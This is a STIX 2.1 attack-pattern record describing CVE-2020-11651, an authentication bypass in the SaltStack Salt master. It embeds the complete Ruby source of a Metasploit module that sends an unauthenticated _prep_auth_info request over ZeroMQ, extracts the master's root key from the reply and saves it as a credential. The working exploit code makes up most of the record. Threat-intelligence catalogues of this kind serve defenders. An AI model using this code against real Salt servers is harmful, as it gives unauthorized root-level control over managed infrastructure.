{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e02e03ad-9160-40ed-b373-12804796cb23",
    "created": "2024-08-14T16:31:40.831033Z",
    "modified": "2024-08-14T16:31:40.831037Z",
    "name": "SaltStack Salt Master Server Root Key Disclosure",
    "description": " This module exploits unauthenticated access to the _prep_auth_info() method in the SaltStack Salt master's ZeroMQ request server, for versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the root key used to authenticate administrative commands to the master.  VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2 1.3, 1.5, and 1.6 in certain configurations, are known to be affected by the Salt vulnerabilities.  Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as well as Vulhub's Docker image. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/saltstack_salt_root_key.rb",
            "external_id": "saltstack_salt_root_key.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/advisories/saltstack-authorization-bypass"
        },
        {
            "source_name": "reference",
            "url": "https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0009.html"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-salt-2vx545AG"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::ZeroMQ\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SaltStack Salt Master Server Root Key Disclosure',\n        'Description' => %q{\n          This module exploits unauthenticated access to the _prep_auth_info()\n          method in the SaltStack Salt master's ZeroMQ request server, for\n          versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the\n          root key used to authenticate administrative commands to the master.\n\n          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\n          well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\n          Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n          1.3, 1.5, and 1.6 in certain configurations, are known to be affected\n          by the Salt vulnerabilities.\n\n          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\n          well as Vulhub's Docker image.\n        },\n        'Author' => [\n          'F-Secure', # Discovery\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-11651'], # Auth bypass (used by this module)\n          ['CVE', '2020-11652'], # Authed directory traversals (not used here)\n          ['URL', 'https://labs.f-secure.com/advisories/saltstack-authorization-bypass'],\n          ['URL', 'https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0009.html'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-salt-2vx545AG'],\n          ['URL', 'https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py']\n        ],\n        'DisclosureDate' => '2020-04-30', # F-Secure advisory\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['Dump', { 'Description' => 'Dump root key from Salt master' }]\n        ],\n        'DefaultAction' => 'Dump',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(4506)\n    ])\n  end\n\n  def run\n    # These are from Msf::Exploit::Remote::ZeroMQ\n    zmq_connect\n    zmq_negotiate\n\n    unless (root_key = extract_root_key(yeet_prep_auth_info))\n      print_error('Could not find root key in serialized auth info')\n\n      # Return CheckCode for exploit/linux/misc/saltstack_salt_unauth_rce\n      return Exploit::CheckCode::Safe\n    end\n\n    print_good(\"Root key: #{root_key}\")\n\n    # I hate this API, but store the root key in creds, too\n    create_credential_and_login(\n      workspace_id: myworkspace_id,\n      module_fullname: fullname,\n      origin_type: :service,\n      address: rhost,\n      port: rport,\n      protocol: 'tcp',\n      service_name: 'salt/zeromq',\n      username: 'root',\n      private_data: root_key,\n      private_type: :password\n    )\n\n    # Return CheckCode for exploit/linux/misc/saltstack_salt_unauth_rce\n    Exploit::CheckCode::Vulnerable(root_key) # And the root key as the reason!\n  rescue EOFError, Rex::ConnectionError => e\n    print_error(\"#{e.class}: #{e.message}\")\n    Exploit::CheckCode::Unknown\n  ensure\n    # This is from Msf::Exploit::Remote::ZeroMQ\n    zmq_disconnect\n  end\n\n  def yeet_prep_auth_info\n    print_status(\"Yeeting _prep_auth_info() at #{peer}\")\n\n    zmq_send_message(serialize_clear_load('cmd' => '_prep_auth_info'))\n\n    unless (res = sock.get_once)\n      fail_with(Failure::Unknown, 'Did not receive auth info')\n    end\n\n    unless res.match(/user.+UserAuthenticationError.+root/m)\n      fail_with(Failure::UnexpectedReply,\n                \"Did not receive serialized auth info: #{res.inspect}\")\n    end\n\n    vprint_good('Received serialized auth info')\n\n    # HACK: Strip assumed ZeroMQ header and leave assumed MessagePack \"load\"\n    res[4..]\n  end\n\n  def extract_root_key(auth_info)\n    # Fetch root key from appropriate index of deserialized data, presumably\n    MessagePack.unpack(auth_info)[2]&.fetch('root')\n  rescue EOFError, KeyError, MessagePack::MalformedFormatError => e\n    print_error(\"#{__method__} failed: #{e.message}\")\n    nil\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-30, # F-Secure advisory"
}